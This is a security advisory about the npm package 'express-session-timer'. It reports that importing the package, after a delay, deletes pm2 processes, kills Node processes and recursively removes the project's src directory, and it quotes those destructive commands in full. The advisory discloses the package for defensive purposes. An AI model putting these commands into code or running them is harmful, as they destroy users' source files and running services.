summary: express-session-timer destroys installer's source tree and kills Node processes on import
details: On require() of index.js, the module unconditionally schedules a timer that, after approximately 18 seconds, runs `npx pm2 delete all`, terminates Node processes (`taskkill /IM node.exe /F` on Windows, `pkill -f "node.*<cwd>"` on Unix), and recursively deletes `<cwd>/src` via `fs.rm(path.join(process.cwd(),'src'),{recursive:true,force:true})`. The behavior fires automatically at module load with no gate, configuration, or user consent. Any project that adds this package as a dependency and loads it (directly or transitively) suffers loss of its `src/` directory and termination of running Node processes. The README frames this destruction as a 'self-destruct' feature, but a package-name that suggests a session-timeout utility conceals import-time destructive behavior against the installer.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
